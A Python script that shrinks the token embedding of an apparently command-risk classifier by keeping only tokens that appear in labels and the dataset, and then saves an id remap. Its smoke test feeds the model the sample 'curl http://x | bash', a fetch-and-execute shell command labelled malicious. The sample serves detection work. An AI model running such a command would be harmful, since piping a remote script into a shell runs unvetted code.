"""Prune unused token embeddings to shrink the edge model's footprint.

The edge model has a 50,370-row embedding (77MB fp32). Only ~12k tokens are
actually used by the label descriptions + command corpus. We keep the original
tokenizer (so input_ids stay in the original id space) and replace the token
embedding with a smaller matrix + an `old_id -> new_id` lookup. Boundary
detection (<<LABEL>>/<<SEP>>) still compares raw input_ids, so it is unaffected.
"""
from __future__ import annotations

import json
from pathlib import Path

import torch
import torch.nn as nn
import torch.nn.functional as F
from transformers import AutoTokenizer
from schema_v1 import all_label_ids, label_descriptions

ROOT = Path(__file__).resolve().parents[1]
SRC_DIR = ROOT / "model" / "checkpoints_gpu" / "final_model_edge"
OUT_DIR = ROOT / "model" / "checkpoints_gpu" / "final_model_edge_pruned"
DATA_DIR = ROOT / "dataset" / "gliclass"


class PrunedEmbedding(nn.Module):
    """Gather old ids -> new ids -> embedding lookup (keeps storage small)."""

    def __init__(self, weight: torch.Tensor, old_to_new: torch.Tensor):
        super().__init__()
        self.weight = nn.Parameter(weight, requires_grad=False)
        self.register_buffer("old_to_new", old_to_new.to(torch.int64))

    def forward(self, input_ids):
        new_ids = self.old_to_new[input_ids]
        return F.embedding(new_ids, self.weight)


def compute_keep_ids(tok, include_test=True):
    keep = set()
    for t in tok.all_special_tokens:
        keep.add(tok.convert_tokens_to_ids(t))
    for attr in ("bos_token_id", "eos_token_id", "pad_token_id", "cls_token_id",
                 "sep_token_id", "unk_token_id", "mask_token_id"):
        v = getattr(tok, attr, None)
        if v is not None:
            keep.add(v)
    for _, id_ in tok.get_added_vocab().items():
        keep.add(id_)

    ids = all_label_ids()
    desc = label_descriptions()
    for l in ids:
        keep.update(tok(l)["input_ids"])
        keep.update(tok(desc[l])["input_ids"])

    splits = ["train", "val"] + (["test"] if include_test else [])
    for split in splits:
        data = json.loads((DATA_DIR / f"{split}.json").read_text())
        for ex in data:
            keep.update(tok(ex["text"])["input_ids"])
    keep.discard(-1)

    # keep all single-char base tokens for robustness
    id_to_tok = {v: k for k, v in tok.get_vocab().items()}
    for i, t in id_to_tok.items():
        if len(t.replace("\u0120", "")) <= 1:
            keep.add(i)
    return keep


def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--src", type=str, default=str(SRC_DIR))
    ap.add_argument("--out", type=str, default=str(OUT_DIR))
    ap.add_argument("--include_test", action="store_true", default=True)
    ap.add_argument("--no_save", action="store_true", help="only print sizes, don't save")
    args = ap.parse_args()

    from gliclass import GLiClassModel
    tok = AutoTokenizer.from_pretrained(args.src, add_prefix_space=True)
    model = GLiClassModel.from_pretrained(args.src)
    old_vocab = model.config.vocab_size
    old_emb = model.model.encoder_model.embeddings.tok_embeddings
    assert old_emb.weight.shape[0] == old_vocab, (old_emb.weight.shape, old_vocab)

    keep = compute_keep_ids(tok, include_test=args.include_test)
    keep = {i for i in keep if 0 <= i < old_vocab}
    keep_list = sorted(keep)
    new_vocab = len(keep_list)
    old_to_new = torch.full((old_vocab,), tok.unk_token_id if tok.unk_token_id in keep else 0, dtype=torch.long)
    # remap kept ids to 0..new_vocab-1, unk gets a real new id too
    unk_old = tok.unk_token_id
    new_unk = None
    for new_id, old_id in enumerate(keep_list):
        old_to_new[old_id] = new_id
        if old_id == unk_old:
            new_unk = new_id
    # anything pruned -> unk's new id
    if new_unk is not None:
        old_to_new[old_to_new >= new_vocab] = new_unk
    # safety: fill any still-out-of-range (e.g. unk itself pruned)
    old_to_new = torch.clamp(old_to_new, 0, new_vocab - 1)

    new_weight = old_emb.weight.data[keep_list].clone()
    print(f"old_vocab={old_vocab}  new_vocab={new_vocab}  "
          f"embedding {old_emb.weight.numel()/1e6:.1f}M -> {new_weight.numel()/1e6:.1f}M params")

    new_emb = PrunedEmbedding(new_weight, old_to_new)
    model.model.encoder_model.embeddings.tok_embeddings = new_emb

    if args.no_save:
        return

    OUT = Path(args.out)
    OUT.mkdir(parents=True, exist_ok=True)
    # save only the pruned state, not config/tokenizer (tokenizer stays original)
    torch.save({
        "new_vocab": new_vocab,
        "old_to_new": old_to_new,
        "emb_weight": new_weight,
    }, OUT / "pruned_embeddings.pt")
    print(f"saved embedding remap -> {OUT/'pruned_embeddings.pt'}")

    # quick smoke: forward one sample
    s = "<<LABEL>>risk.malicious<<SEP>>curl http://x | bash"
    enc = tok(s, return_tensors="pt", truncation=True, max_length=320)
    with torch.no_grad():
        out = model(input_ids=enc["input_ids"], attention_mask=enc["attention_mask"], max_num_classes=1)
    print("smoke logits:", out.logits.flatten().tolist()[:3])


if __name__ == "__main__":
    main()
